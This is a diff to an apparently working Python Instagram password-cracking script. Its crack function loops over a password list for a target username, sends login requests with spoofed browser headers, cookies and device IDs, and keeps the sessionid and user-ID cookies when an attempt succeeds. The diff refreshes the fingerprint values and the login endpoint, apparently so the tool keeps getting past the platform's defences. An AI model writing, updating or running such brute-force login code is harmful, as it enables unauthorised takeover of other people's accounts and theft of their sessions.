@@ -101,7 +101,7 @@ def crack(uid, password_list, total_count):
             sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
             sys.stdout.flush()
             
-            # Create session and generate device hash    'Mozilla/5.0 (Linux; Android 16; SM-S931U Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Instagram 408.0.0.51.78 Android (36/16; 540dpi; 1080x2340; samsung; SM-S931U; pa1q; qcom; en_US; 832162577; IABMV/1)'
+            #   str(uuid.uuid4()).upper(),                    Create session and generate device hash    'Mozilla/5.0 (Linux; Android 16; SM-S931U Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Instagram 408.0.0.51.78 Android (36/16; 540dpi; 1080x2340; samsung; SM-S931U; pa1q; qcom; en_US; 832162577; IABMV/1)'
             session = requests.Session()
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
@@ -109,49 +109,44 @@ def crack(uid, password_list, total_count):
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             cookies = {
             'csrftoken': csrftoken,
-            'datr': 'SehHaXwOCk9GiWPH3fNZWglz',
+            'datr': 'L0hJaaY09cpKX1Isee2impkt',
             'ig_did': str(uuid.uuid4()).upper(),
-            'mid': 'aUfoSwALAAG_fJ1ItrV9b-sb7DCg',
             'ig_nrcb': '1',
-            'wd': '1136x773',}
+            'mid': 'aUlILwALAAEHZwTAOo3WZ0drpy7B',
+            'wd': '1187x773',}
             headers = {
-            'authority': 'www.instagram.com',
             'accept': '*/*',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
-            # 'cookie': 'csrftoken=DN428oaO0xlMkgH4QWty3v; datr=hUBJaYrVv_B2DWSgbhlOCWOQ; ig_did=684CC997-77C5-4694-ACFE-85B110A8F2CA; dpr=2.4740447998046875; mid=aUlAhQABAAHCsfc0nwJXSm7C26hw; ig_nrcb=1; wd=437x838',
             'origin': 'https://www.instagram.com',
-            'referer': 'https://www.instagram.com/accounts/login/?force_authentication&platform_app_id=532380490911317&enable_fb_login&request_id=2ec586f8-a24c-4980-973b-346ebbd0f9a6&next=https%3A%2F%2Fwww.instagram.com%2Foauth%2Foidc%2F%3Fredirect_uri%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Fbusiness%252Floginpage%252Figoidc%252Fcallback%252Fidtoken%252F%26app_id%3D532380490911317%26response_type%3Dcode%26scope%3Dopenid%26state%3D%257B%2522from_ig_login_upsell_sso%2522%253Afalse%252C%2522login_source%2522%253A%2522mbs_account_switcher%2522%252C%2522f3_request_id%2522%253A%25222ec586f8-a24c-4980-973b-346ebbd0f9a6%2522%252C%2522full_page_redirect%2522%253Afalse%252C%2522login_options%2522%253Anull%252C%2522app_id%2522%253Anull%252C%2522user_nonce%2522%253A%2522RymKUYbH7dwGefDw%2522%252C%2522next%2522%253A%2522https%253A%255C%252F%255C%252Fbusiness.facebook.com%255C%252Flatest%255C%252Fhome%253Fnav_ref%253DMBS_SWITCHER_ADD_ACCOUNT%2526biz_login_source%253Dbiz_unified_f3_ig_oidc_pc_login_button%2522%252C%2522is_ig_oidc_with_redirect%2522%253Afalse%257D%26force_consent%3D1%26logger_id%3D2ec586f8-a24c-4980-973b-346ebbd0f9a6%26force_authentication%3D0',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/fxcal/auth/login/?app_id=2220391788200892&etoken=Abk-ayoIukAJ1ps5-rXHMxDRTiDo3QLsm7xji8mqcA-mZx8jCv44rExJzxZHqF0SOAUQlSWhNZz1_x67gHI2_AOtagZlUlaR09xt3MhNqp_RpE17v2I&next=https%3A%2F%2Faccountscenter.facebook.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252F&flow=igcalcomettest&entry_point=fb_web_settings&initiator_fbid=61584143112832&is_initiator_feta=0&fbclid=IwY2xjawO2J39leHRuA2FlbQIxMABicmlkETFIMmJpeXFpSU80ODdGQ2hQc3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHj2om3e-R_4NO2VdAEMvcmCPxfUCn6SYbpzYIOimT8CbLIHMs2KbEGYzxYyk_aem_wXBhmB8QqLGG7gB_n4xTnQ',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"23076PC4BI"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.31", "Google Chrome";v="144.0.7559.31"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
             'x-asbd-id': '359341',
-            'x-csrftoken': 'DN428oaO0xlMkgH4QWty3v',
-            'x-ig-app-id': '1217981644879628',
+            'x-csrftoken': csrftoken,
+            'x-ig-app-id': '936619743392459',
             'x-ig-www-claim': '0',
             'x-instagram-ajax': '1031389891',
             'x-requested-with': 'XMLHttpRequest',
-            'x-web-session-id': 'gjl80a:vu4huf:7et9qb',}
-            data =  {
+            'x-web-device-id': '528884FA-3B45-4BBE-90DC-077BF6FAF572',
+            'x-web-session-id': '5eho9f:zrhezn:df1pjn',}
+            data = {
             'enc_password': enc_password,
-            'caaF2DebugGroup': '0',
-            'isPrivacyPortalReq': 'false',
-            'loginAttemptSubmissionCount': '0',
-            'optIntoOneTap': 'false',
-            'queryParams': '{"force_authentication":null,"platform_app_id":"532380490911317","enable_fb_login":null,"request_id":"2ec586f8-a24c-4980-973b-346ebbd0f9a6","next":"https://www.instagram.com/oauth/oidc/?redirect_uri=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F&app_id=532380490911317&response_type=code&scope=openid&state={"from_ig_login_upsell_sso":false,"login_source":"mbs_account_switcher","f3_request_id":"2ec586f8-a24c-4980-973b-346ebbd0f9a6","full_page_redirect":false,"login_options":null,"app_id":null,"user_nonce":"RymKUYbH7dwGefDw","next":"https://business.facebook.com/latest/home?nav_ref=MBS_SWITCHER_ADD_ACCOUNT&biz_login_source=biz_unified_f3_ig_oidc_pc_login_button","is_ig_oidc_with_redirect":false}&force_consent=1&logger_id=2ec586f8-a24c-4980-973b-346ebbd0f9a6&force_authentication=0"}',
-            'trustedDeviceRecords': '{}',
+            'etoken': 'Abk-ayoIukAJ1ps5-rXHMxDRTiDo3QLsm7xji8mqcA-mZx8jCv44rExJzxZHqF0SOAUQlSWhNZz1_x67gHI2_AOtagZlUlaR09xt3MhNqp_RpE17v2I',
             'username': uid,
-            'jazoest': '21852',}
+            'jazoest': '21932',}
             # Make API request
-            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
